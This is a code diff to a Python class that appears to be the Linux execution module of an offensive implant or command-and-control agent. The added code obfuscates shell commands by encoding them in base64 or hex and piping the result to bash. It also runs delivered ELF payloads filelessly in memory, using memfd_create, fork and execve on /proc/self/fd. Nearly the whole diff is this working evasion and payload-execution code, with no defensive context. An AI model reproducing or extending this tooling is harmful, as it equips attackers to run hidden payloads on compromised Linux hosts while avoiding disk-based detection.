@@ -9,8 +9,18 @@ import uuid
 import shlex
 from typing import Dict, Any, List, Tuple, Optional
 from datetime import datetime
+import ctypes
+import errno # For checking syscall errors
 
 logger = logging.getLogger(__name__)
+
+# Define memfd_create syscall number (common on x86_64)
+# Find dynamically? For now, assume standard number.
+# Alternatively, try libc.memfd_create first.
+SYS_memfd_create = 319 # Common on x86_64, may vary on other archs
+
+# memfd_create flags
+MFD_CLOEXEC = 0x0001 # Close on exec flag
 
 class LinuxExecution:
     """Handles Linux/Unix-like specific command and payload execution."""
@@ -97,13 +107,43 @@ class LinuxExecution:
 
     # --- Obfuscation Helper (Linux/Unix specific could be added) ---
     def _apply_obfuscation(self, command: str, method: str, obfuscation_type: Optional[str]) -> Tuple[str, Optional[str]]:
-        """Applies Linux/Unix-relevant obfuscation techniques (Placeholder)."""
+        """Applies Linux/Unix-relevant obfuscation techniques."""
         if not obfuscation_type:
             return command, None
 
-        logger.warning(f"Linux/Unix obfuscation type '{obfuscation_type}' requested but not implemented. Returning original command.")
-        # Add Linux specific obfuscation later (e.g., hex encoding, command substitution)
-        return command, None
+        obfuscated_command = command
+        applied_obfuscation = None
+        logger.info(f"Applying Linux/Unix obfuscation type '{obfuscation_type}' for method '{method}'")
+
+        if obfuscation_type == "base64":
+            # Encode the command and wrap it for shell execution
+            try:
+                encoded_cmd = base64.b64encode(command.encode('utf-8')).decode('ascii')
+                # Wrap for bash/sh: echo '...' | base64 -d | bash
+                obfuscated_command = f"echo {encoded_cmd} | base64 -d | {method if method in ['bash', 'sh'] else 'bash'}"
+                applied_obfuscation = "base64_shell_pipe"
+            except Exception as e:
+                logger.warning(f"Base64 encoding for Linux shell failed: {e}. Using original command.")
+
+        elif obfuscation_type == "hex":
+            # Encode the command as hex and wrap it (less common, more for specific tools)
+            try:
+                hex_cmd = command.encode('utf-8').hex()
+                # Wrap for bash/sh: printf '\\x...' | bash
+                hex_cmd_escaped = "".join([f"\\x{hex_cmd[i:i+2]}" for i in range(0, len(hex_cmd), 2)])
+                obfuscated_command = f"printf '{hex_cmd_escaped}' | {method if method in ['bash', 'sh'] else 'bash'}"
+                applied_obfuscation = "hex_shell_pipe"
+            except Exception as e:
+                logger.warning(f"Hex encoding for Linux shell failed: {e}. Using original command.")
+
+        # Add other Linux techniques like string splitting, command substitution, etc.
+        else:
+            logger.warning(f"Unsupported Linux/Unix obfuscation type requested: '{obfuscation_type}'.")
+
+        if applied_obfuscation:
+             logger.info(f"Applied obfuscation '{applied_obfuscation}'. Resulting command starts: {obfuscated_command[:100]}...")
+             
+        return obfuscated_command, applied_obfuscation
 
     # --- Command Execution Handler ---
     def _handle_command_execution(self, data: Dict[str, Any]) -> Dict[str, Any]:
@@ -173,11 +213,13 @@ class LinuxExecution:
 
     # --- Payload Execution Handler ---
     def _handle_payload_execution(self, data: Dict[str, Any]) -> Dict[str, Any]:
-        """Handles Linux/Unix payload execution."""
+        """Handles Linux/Unix payload execution via disk or memory (memfd_create)."""
         content_b64 = data.get("content_b64")
         method = data.get("method") # disk, memory
-        file_extension = data.get("file_extension", ".sh") # Default to shell script
-        args = data.get("args", [])
+        file_extension = data.get("file_extension", ".elf") # Default to ELF for memory exec
+        args = data.get("args", []) # Arguments for the payload
+        payload_name_hint = data.get("payload_name", "bluefire_payload") # Name for memfd
+        wait_for_child = data.get("wait_for_child", True) # Wait for memfd process?
 
         if not content_b64 or not method:
             return {"status": "failure", "reason": "Missing content_b64 or method for payload execution."}
@@ -194,13 +236,14 @@ class LinuxExecution:
             "payload_size_bytes": len(payload_bytes),
             "args_provided": args,
         }
+        if method == "memory":
+            result_details["payload_name_hint"] = payload_name_hint
+            result_details["wait_for_child"] = wait_for_child
 
         if method == "disk":
             temp_file_path = None
             try:
-                # Use /tmp or another writable location
                 temp_dir = "/tmp"
-                # Ensure temp_dir exists and is writable?
                 if not os.path.isdir(temp_dir) or not os.access(temp_dir, os.W_OK):
                      temp_dir = tempfile.gettempdir()
                      logger.warning(f"/tmp not available, using default temp dir: {temp_dir}")
@@ -212,7 +255,6 @@ class LinuxExecution:
                     tmp_file.write(payload_bytes)
                 logger.info(f"Payload written to temporary file: {temp_file_path}")
 
-                # Make executable
                 try:
                     current_st = os.stat(temp_file_path)
                     os.chmod(temp_file_path, current_st.st_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)
@@ -223,7 +265,6 @@ class LinuxExecution:
                 command_parts = [temp_file_path] + args
                 command_str = " ".join(shlex.quote(part) for part in command_parts)
 
-                # Execute directly, no shell
                 return_code, stdout, stderr = self._run_command(command_str, shell=None, use_shell=False, capture=True)
 
                 result_details["temp_file_path"] = temp_file_path
@@ -249,11 +290,113 @@ class LinuxExecution:
                         logger.warning(f"Failed to cleanup temporary file {temp_file_path}: {e_clean}")
 
         elif method == "memory":
-            # Placeholder for Linux/Unix memory execution (e.g., memfd_create, LD_PRELOAD for shared libs)
-            logger.warning(f"Linux/Unix payload execution method '{method}' is not implemented.")
-            status = "not_implemented"
-            reason = "Linux/Unix memory execution is not implemented."
-            result_details["reason"] = reason
+            self.logger.info(f"Attempting memory execution (memfd_create) for {len(payload_bytes)} byte payload.")
+            libc = None
+            memfd = -1
+            child_pid = -1
+            
+            try:
+                # Try to load libc
+                try:
+                    libc = ctypes.CDLL("libc.so.6", use_errno=True)
+                except OSError as e:
+                    raise OSError(f"Failed to load libc.so.6: {e}") from e
+
+                # 1. Create anonymous file descriptor using memfd_create
+                # Try direct function first, then syscall fallback
+                memfd = -1
+                memfd_name = payload_name_hint.encode('utf-8')
+                if hasattr(libc, 'memfd_create'):
+                    libc.memfd_create.argtypes = [ctypes.c_char_p, ctypes.c_uint]
+                    libc.memfd_create.restype = ctypes.c_int
+                    memfd = libc.memfd_create(memfd_name, MFD_CLOEXEC)
+                else:
+                     logger.debug(f"libc.memfd_create not found, trying syscall {SYS_memfd_create}.")
+                     libc.syscall.argtypes = [ctypes.c_long, ctypes.c_char_p, ctypes.c_uint]
+                     libc.syscall.restype = ctypes.c_int
+                     memfd = libc.syscall(SYS_memfd_create, memfd_name, MFD_CLOEXEC)
+
+                if memfd == -1:
+                     err = ctypes.get_errno()
+                     raise OSError(f"memfd_create failed: {errno.errorcode.get(err, 'Unknown errno')} ({err}) - Kernel might not support it (>= 3.17 required).")
+                
+                logger.debug(f"Created memfd: {memfd} with name '{payload_name_hint}'")
+                result_details["memfd"] = memfd
+
+                # 2. Write payload to memfd
+                bytes_written = 0
+                offset = 0
+                payload_len = len(payload_bytes)
+                while offset < payload_len:
+                    written = os.write(memfd, payload_bytes[offset:])
+                    if written <= 0:
+                         raise IOError(f"Failed to write payload to memfd {memfd}. os.write returned {written}.")
+                    offset += written
+                bytes_written = offset
+                logger.debug(f"Wrote {bytes_written} bytes to memfd {memfd}.")
+                if bytes_written != payload_len:
+                     logger.warning(f"Bytes written ({bytes_written}) does not match payload length ({payload_len}).")
+
+                # 3. Fork process
+                child_pid = os.fork()
+
+                if child_pid == 0:
+                    # --- Child Process --- 
+                    try:
+                         # Construct argv for execve (arg0 should be the program name/path)
+                         exec_argv = [f"/proc/self/fd/{memfd}"] + args
+                         logger.debug(f"Child (PID {os.getpid()}): Executing memfd {memfd} with argv: {exec_argv}")
+                         # Execute from the file descriptor
+                         os.execve(exec_argv[0], exec_argv, os.environ)
+                         # If execve returns, it failed
+                         logger.error(f"Child (PID {os.getpid()}): os.execve failed!") 
+                         os._exit(127) # Standard exit code for command not found/exec failure
+                    except Exception as e_child:
+                         logger.error(f"Child (PID {os.getpid()}) error before/during execve: {e_child}", exc_info=True)
+                         os._exit(126) # Standard exit code for command invoked cannot execute
+                    # -------------------
+                
+                # --- Parent Process --- 
+                logger.info(f"Forked child process PID {child_pid} to execute payload from memfd {memfd}.")
+                result_details["child_pid"] = child_pid
+                
+                # 4. Optionally wait for child
+                child_exit_status = None
+                if wait_for_child:
+                     logger.debug(f"Parent (PID {os.getpid()}): Waiting for child PID {child_pid}...")
+                     pid, exit_status = os.waitpid(child_pid, 0)
+                     child_exit_status = exit_status
+                     result_details["child_exit_status"] = child_exit_status
+                     if os.WIFEXITED(exit_status) and os.WEXITSTATUS(exit_status) == 0:
+                          logger.info(f"Child process {pid} exited successfully (Status: {exit_status}).")
+                          status = "success"
+                          reason = f"Payload executed successfully via memfd in child PID {pid}."
+                     else:
+                          reason = f"Child process {pid} exited with non-zero status: {exit_status}."
+                          logger.error(reason)
+                          # Keep status as failure if child fails
+                else:
+                     status = "success"
+                     reason = f"Child process {child_pid} created successfully to execute payload from memfd (no wait requested)."
+                     logger.info(reason)
+                     
+            except (OSError, IOError) as e:
+                reason = f"Memory execution failed: {e}"
+                logger.error(reason, exc_info=True)
+                status = "failure"
+            except Exception as e:
+                reason = f"Unexpected error during memory execution: {e}"
+                logger.error(reason, exc_info=True)
+                status = "failure"
+            finally:
+                 # 5. Close memfd in parent
+                 if memfd != -1:
+                      try:
+                           os.close(memfd)
+                           logger.debug(f"Closed memfd {memfd} in parent.")
+                      except Exception as e_close:
+                           logger.warning(f"Failed to close memfd {memfd}: {e_close}")
+                           if reason: reason += " | Warning: Failed to close memfd."
 
         else:
              reason = f"Unsupported payload execution method: {method}"
